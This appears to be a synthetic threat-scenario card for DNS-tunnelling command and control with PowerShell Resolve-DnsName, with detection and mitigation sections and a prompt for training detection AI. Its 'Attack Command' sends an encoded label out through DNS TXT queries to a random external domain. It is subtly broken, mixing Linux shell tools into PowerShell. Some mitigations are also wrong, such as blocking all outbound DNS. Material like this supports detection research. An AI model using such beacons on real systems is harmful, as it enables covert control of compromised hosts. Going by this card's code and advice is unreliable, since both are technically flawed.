---
type: campaign
scenario_id: 353
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell Resolve-DnsName for DNS tunneling C2.

## Threat Description
Using PowerShell Resolve-DnsName for DNS tunneling C2.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor Resolve-DnsName: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`; DNS TXT query spikes: `tshark -Y 'dns.qry.type == 16'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell-based DNS tunneling by analyzing Resolve-DnsName TXT query patterns, base64-encoded subdomains, and DNS traffic anomalies; suggest PowerShell restrictions.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
